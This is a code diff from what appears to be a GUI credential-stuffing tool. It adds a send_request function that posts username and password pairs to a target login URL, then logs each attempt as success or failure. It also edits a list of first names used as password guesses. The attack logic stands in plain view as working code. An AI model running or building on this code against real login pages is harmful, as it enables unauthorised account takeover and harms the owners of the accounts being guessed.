@@ -2,7 +2,6 @@ import threading
 
 import requests
 
-from global_functions import send_request
 from gui.credential_stuffing.credential import Credential
 from gui.credential_stuffing.process_manager import is_stopped
 from gui.credential_stuffing.success_manager import add_tested_credential, add_finish, add_failed_request
@@ -14,7 +13,7 @@ global_credentials_list = [
 keywords = [
     "Liam",
     "Emma",
-    "Noah", "Ava", "Oliver", "Isabella", "Elijah", "Sophia",
+    "Noah", "Evan", "Oliver", "Isabella", "Elijah", "Sophia",
     # "James",
     # "Amelia", "Benjamin", "Mia", "William", "Charlotte", "Lucas", "Evelyn", "Henry", "Abigail", "Alexander",
     # "Harper", "Jack", "Ella", "Daniel", "Scarlett", "Matthew", "Aria", "Samuel", "Grace", "Jackson",
@@ -95,3 +94,37 @@ def send_request_instance(username_var, username_value, password_var, password_v
 
     if keyword != "None": add_finish(keyword)
     add_tested_credential(credential)
+
+
+def send_request(username_var, username_value, password_var, password_value,
+                 login_success_var, url, headers, console_view: ConsoleView):
+    try:
+        trying = "[INFO] Trying password: {} and {}: {}".format(password_value, username_var,
+                                                                username_value)
+        console_view.add_text_schedule(trying)
+        print(trying)
+
+        payload = {
+            username_var: username_value,
+            password_var: password_value
+        }
+
+        response = requests.post(url, json=payload, headers=headers)
+
+        if login_success_var in response.text or response.status_code == 200:
+            success_msg = f"[SUCCESS] Password {password_value} and {username_var} {username_value} are correct"
+            console_view.add_text_schedule(success_msg)
+            print(success_msg)
+            return True
+
+        else:
+            failed_msg = f"[FAILED] Password {password_value} and {username_var} {username_value} incorrect"
+            console_view.add_text_schedule(failed_msg)
+            print(failed_msg)
+
+    except Exception as e:
+        error_msg = f"[ERROR] Error: {e}"
+        console_view.add_text_schedule(error_msg)
+        print(error_msg)
+
+    return False
